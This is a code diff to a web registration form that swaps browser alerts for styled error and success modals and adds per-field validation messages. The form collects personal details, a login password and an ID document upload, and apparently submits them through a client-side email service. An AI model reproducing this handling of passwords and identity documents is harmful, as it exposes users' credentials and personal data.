@@ -394,7 +394,7 @@
       font-size: 14px;
     }
 
-    /* Modal */
+    /* Modal styles - for both success and error */
     .modal {
       display: none;
       position: fixed;
@@ -441,14 +441,32 @@
       stroke-width: 3;
     }
 
+    .error-icon {
+      width: 70px;
+      height: 70px;
+      background: #b91c1c;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .error-icon svg {
+      width: 40px;
+      height: 40px;
+      stroke: white;
+      stroke-width: 2.5;
+    }
+
     .modal h3 {
-      color: #002a5c;
+      color: #1f2937;
       margin-bottom: 15px;
       font-size: 22px;
     }
 
     .modal p {
-      color: #4b5563;
+      color: #6b7280;
       line-height: 1.6;
       margin-bottom: 25px;
     }
@@ -457,6 +475,14 @@
       width: auto;
       padding: 12px 40px;
       margin: 0;
+    }
+
+    .error-modal button {
+      background: #b91c1c;
+    }
+
+    .error-modal button:hover {
+      background: #991b1b;
     }
 
     @media (max-width: 600px) {
@@ -636,7 +662,7 @@
           </div>
           <div id="uploadProgress" class="upload-progress" style="display:none;"></div>
 
-          <!-- Section 6: Terms -->
+          <!-- Section 6: Terms - Only first two required -->
           <div class="checkbox-group">
             <div class="checkbox-item">
               <input type="checkbox" id="termsConfirm">
@@ -650,7 +676,7 @@
             
             <div class="checkbox-item">
               <input type="checkbox" id="termsConsent">
-              <label for="termsConsent">I consent to electronic communications</label>
+              <label for="termsConsent">I consent to electronic communications (optional)</label>
             </div>
           </div>
 
@@ -712,7 +738,23 @@
         Please check your email within 24 hours for your account details.<br><br>
         <strong>Your login password:</strong> The password you created will be your login credentials.
       </p>
-      <button onclick="closeModal()">OK</button>
+      <button onclick="closeModal('successModal')">OK</button>
+    </div>
+  </div>
+
+  <!-- Error Modal - Premium replacement for alerts -->
+  <div id="errorModal" class="modal">
+    <div class="modal-content">
+      <div class="error-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <circle cx="12" cy="16" r="0.5" fill="white" stroke="white"></circle>
+        </svg>
+      </div>
+      <h3>Unable to proceed</h3>
+      <p id="errorMessage"></p>
+      <button onclick="closeModal('errorModal')" style="background: #b91c1c;">Got it</button>
     </div>
   </div>
 
@@ -762,13 +804,25 @@
       
       if (input.type === 'password') {
         input.type = 'text';
-        // Change to eye-slash icon
         eye.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
       } else {
         input.type = 'password';
-        // Change back to eye icon
         eye.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
       }
+    }
+
+    // Modal functions
+    function showModal(modalId) {
+      document.getElementById(modalId).classList.add('show');
+    }
+
+    function closeModal(modalId) {
+      document.getElementById(modalId).classList.remove('show');
+    }
+
+    function showError(message) {
+      document.getElementById('errorMessage').textContent = message;
+      showModal('errorModal');
     }
 
     // File upload with Cloudinary
@@ -776,7 +830,6 @@
       const file = e.target.files[0];
       if (!file) return;
       
-      // Show progress
       const progressDiv = document.getElementById('uploadProgress');
       progressDiv.style.display = 'block';
       progressDiv.textContent = 'Uploading...';
@@ -808,33 +861,55 @@
       });
     });
 
-    // Submit registration
+    // Submit registration with premium error modal
     function submitRegistration() {
       // Validate required fields
-      if (!document.getElementById('fullName').value ||
-          !document.getElementById('email').value ||
-          !document.getElementById('phone').value ||
-          !document.getElementById('dob').value ||
-          !document.getElementById('city').value ||
-          !selectedAccount ||
-          !document.getElementById('pin').value ||
-          !document.getElementById('termsConfirm').checked ||
-          !document.getElementById('termsAgree').checked) {
-        
-        alert('Please complete all required fields and accept the terms.');
+      if (!document.getElementById('fullName').value) {
+        showError('Please enter your full name.');
         return;
       }
-
+      if (!document.getElementById('email').value) {
+        showError('Please enter your email address.');
+        return;
+      }
+      if (!document.getElementById('phone').value) {
+        showError('Please enter your phone number.');
+        return;
+      }
+      if (!document.getElementById('dob').value) {
+        showError('Please enter your date of birth.');
+        return;
+      }
+      if (!document.getElementById('city').value) {
+        showError('Please enter your city.');
+        return;
+      }
+      if (!selectedAccount) {
+        showError('Please select an account type.');
+        return;
+      }
+      if (!document.getElementById('pin').value) {
+        showError('Please create a login password.');
+        return;
+      }
+      
       // Validate password length
       const pin = document.getElementById('pin').value;
       if (pin.length < 12 || pin.length > 16) {
-        alert('Password must be between 12 and 16 characters.');
+        showError('Password must be between 12 and 16 characters.');
+        return;
+      }
+
+      // Validate terms (only first two required)
+      if (!document.getElementById('termsConfirm').checked ||
+          !document.getElementById('termsAgree').checked) {
+        showError('Please confirm your information and accept the Terms & Conditions.');
         return;
       }
 
       // Validate ID upload
       if (!uploadedFileUrl) {
-        alert('Please upload your ID document.');
+        showError('Please upload your ID document.');
         return;
       }
 
@@ -868,7 +943,7 @@
 
       emailjs.send('service_oppnbmh', 'template_tzhyhjn', templateParams)
         .then(function() {
-          document.getElementById('successModal').classList.add('show');
+          showModal('successModal');
           
           // Reset form
           document.getElementById('registrationForm').reset();
@@ -882,17 +957,13 @@
           document.getElementById('uploadBtn').textContent = 'Choose File';
         })
         .catch(function(error) {
-          alert('Submission failed. Please try again.');
+          showError('Submission failed. Please try again.');
           console.error(error);
         })
         .finally(function() {
           btn.textContent = originalText;
           btn.disabled = false;
         });
-    }
-
-    function closeModal() {
-      document.getElementById('successModal').classList.remove('show');
     }
   </script>
 </body>
